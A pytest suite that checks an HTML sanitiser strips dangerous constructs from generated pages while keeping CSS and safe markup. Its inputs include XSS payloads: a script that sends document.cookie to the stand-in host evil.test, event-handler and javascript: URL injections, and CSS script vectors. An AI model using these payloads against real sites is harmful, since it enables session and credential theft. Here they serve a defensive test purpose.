"""Artifact HTML sanitisation — the security-critical path.

Generated HTML is untrusted. These tests assert the sanitiser actually removes each
dangerous construct, keeps the CSS that makes a generated page usable, and reports what
it changed. The sandboxed script-disabled iframe is the second layer, verified in the
frontend tests.
"""

from __future__ import annotations

import pytest

from app.artifacts.sanitizer import CONTENT_SECURITY_POLICY, sanitise_html


def test_script_tags_and_their_contents_are_removed():
    html, report = sanitise_html(
        "<html><body><h1>Hi</h1><script>fetch('https://evil.test?c='+document.cookie)</script></body></html>"
    )

    assert "<script" not in html.lower()
    assert "document.cookie" not in html
    assert "evil.test" not in html
    assert report.removed_tags.get("script") == 1
    assert report.modified is True


@pytest.mark.parametrize(
    "handler",
    ["onclick", "onerror", "onload", "onmouseover", "onfocus"],
)
def test_inline_event_handlers_are_stripped(handler):  # noqa: ANN001
    html, report = sanitise_html(f"<div {handler}=\"alert('xss')\">Text</div>")

    assert handler not in html.lower()
    assert "alert" not in html
    assert report.removed_attributes.get(handler) == 1
    assert "Text" in html, "the visible content should survive"


def test_javascript_urls_are_removed_but_the_link_text_remains():
    html, report = sanitise_html('<a href="javascript:alert(1)">Click me</a>')

    assert "javascript:" not in html.lower()
    assert "Click me" in html
    assert report.removed_urls == 1


@pytest.mark.parametrize("tag", ["iframe", "object", "form", "svg", "noscript", "template"])
def test_dangerous_containers_are_dropped_with_their_contents(tag):  # noqa: ANN001
    html, report = sanitise_html(f"<div><{tag}>payload</{tag}></div>")

    assert f"<{tag}" not in html.lower()
    assert "payload" not in html, "the subtree of a dangerous element must not survive"
    assert report.removed_tags.get(tag) == 1


@pytest.mark.parametrize("tag", ["link", "base", "embed", "input"])
def test_dangerous_void_elements_are_dropped(tag):  # noqa: ANN001
    """Void elements have no subtree: HTML parses following text as a sibling, so only
    the element itself is expected to disappear."""
    html, report = sanitise_html(f'<div><{tag} href="https://evil.test" src="https://evil.test">kept</div>')

    assert f"<{tag}" not in html.lower()
    assert "evil.test" not in html
    assert report.removed_tags.get(tag) == 1
    assert "kept" in html


def test_css_is_preserved_because_html_artifacts_need_styling():
    source = """
    <html><head><style>
      body { font-family: system-ui; margin: 0; }
      .hero { display: grid; gap: 1rem; background: linear-gradient(90deg,#123,#456); }
      @media (max-width: 600px) { .hero { display: block; } }
    </style></head><body><div class="hero">Hero</div></body></html>
    """

    html, _ = sanitise_html(source)

    assert "<style" in html
    assert "font-family: system-ui" in html
    assert "linear-gradient" in html
    assert "@media (max-width: 600px)" in html
    assert 'class="hero"' in html


@pytest.mark.parametrize(
    "css",
    [
        "@import url('https://evil.test/x.css');",
        "body { width: expression(alert(1)); }",
        "body { background: url(javascript:alert(1)); }",
        "a { -moz-binding: url(https://evil.test/x.xml); }",
    ],
)
def test_css_borne_script_vectors_are_neutralised(css):  # noqa: ANN001
    html, report = sanitise_html(f"<html><head><style>{css}</style></head><body>x</body></html>")

    assert "@import" not in html
    assert "expression(" not in html
    assert "javascript:" not in html.lower()
    assert "-moz-binding" not in html
    assert report.css_rules_stripped >= 1


def test_inline_style_attributes_are_also_filtered():
    html, report = sanitise_html('<div style="color: red; background: url(javascript:alert(1))">x</div>')

    assert "javascript:" not in html.lower()
    assert "color: red" in html
    assert report.css_rules_stripped >= 1


def test_a_csp_meta_is_always_injected():
    html, _ = sanitise_html("<html><head><title>T</title></head><body>x</body></html>")

    assert "Content-Security-Policy" in html
    assert CONTENT_SECURITY_POLICY in html
    assert "script-src 'none'" in html


def test_csp_is_injected_even_for_a_fragment():
    html, _ = sanitise_html("<h1>Just a fragment</h1>")

    assert html.lstrip().startswith("<!DOCTYPE html>")
    assert "Content-Security-Policy" in html
    assert "Just a fragment" in html


def test_a_model_supplied_csp_cannot_weaken_ours():
    """A permissive CSP in model output must not be the effective policy."""
    html, _ = sanitise_html(
        '<html><head><meta http-equiv="Content-Security-Policy" '
        "content=\"default-src *; script-src 'unsafe-inline' *\"></head><body>x</body></html>"
    )

    assert "default-src *" not in html
    assert CONTENT_SECURITY_POLICY in html


def test_safe_structural_and_semantic_markup_survives():
    source = """
    <html><body>
      <header><h1>Product</h1></header>
      <main><section><p>Copy with <strong>bold</strong> and <em>italics</em>.</p>
      <ul><li>One</li><li>Two</li></ul>
      <table><thead><tr><th scope="col">H</th></tr></thead><tbody><tr><td colspan="2">C</td></tr></tbody></table>
      <a href="https://example.com" rel="noopener">Link</a>
      </section></main><footer><p>Footer</p></footer>
    </body></html>
    """

    html, report = sanitise_html(source)

    for expected in ("<header", "<main", "<section", "<strong", "<ul", "<table", "scope=\"col\"", "colspan=\"2\"", "<footer"):
        assert expected in html
    assert 'href="https://example.com"' in html
    assert not report.removed_tags


def test_unknown_elements_are_unwrapped_keeping_their_text():
    html, report = sanitise_html("<div><custom-widget>Important copy</custom-widget></div>")

    assert "custom-widget" not in html
    assert "Important copy" in html
    assert report.removed_tags.get("custom-widget") == 1


def test_target_blank_links_get_noopener():
    html, _ = sanitise_html('<a href="https://example.com" target="_blank">x</a>')

    assert "noopener" in html


def test_html_comments_are_removed():
    html, report = sanitise_html("<div><!-- internal note --><p>Visible</p></div>")

    assert "internal note" not in html
    assert report.comments_removed == 1


def test_meta_refresh_redirects_are_removed():
    html, _ = sanitise_html('<html><head><meta http-equiv="refresh" content="0;url=https://evil.test"></head><body>x</body></html>')

    assert "refresh" not in html.lower()
    assert "evil.test" not in html


def test_data_urls_are_blocked_except_images():
    unsafe, unsafe_report = sanitise_html('<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>')
    safe, _ = sanitise_html('<img src="data:image/png;base64,iVBORw0KGgo=" alt="logo">')

    assert "data:text/html" not in unsafe
    assert unsafe_report.removed_urls == 1
    assert "data:image/png" in safe, "inline images are harmless and useful"


def test_clean_document_reports_no_modification():
    _, report = sanitise_html("<html><body><h1>Clean</h1><p>Nothing to remove.</p></body></html>")

    assert report.modified is False
    assert report.to_dict()["removed_tags"] == {}


def test_sanitiser_tolerates_malformed_and_empty_input():
    for source in ("", "<div><p>unclosed", "<<>>", "plain text"):
        html, _ = sanitise_html(source)
        assert "<!DOCTYPE html>" in html or html == ""


def test_mixed_case_and_spaced_script_variants_are_caught():
    html, _ = sanitise_html("<SCRIPT>alert(1)</SCRIPT><IMG SRC=\"JaVaScRiPt:alert(2)\">")

    assert "alert(1)" not in html
    assert "javascript:" not in html.lower()
